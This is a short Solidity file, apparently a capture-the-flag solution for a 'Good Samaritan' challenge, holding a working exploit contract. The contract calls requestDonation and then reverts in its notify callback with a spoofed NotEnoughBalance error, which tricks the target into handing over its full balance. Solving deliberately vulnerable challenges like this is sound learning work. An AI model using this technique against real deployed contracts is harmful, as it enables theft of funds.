// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract GoodSamaritanHack is INotifyable {
    error NotEnoughBalance();

    function attack(address _goodSamaritanAddress) public {
        GoodSamaritan(_goodSamaritanAddress).requestDonation();
    }

    function notify(uint256 amount) public pure {
        if (amount == 10) revert NotEnoughBalance();
    }
}
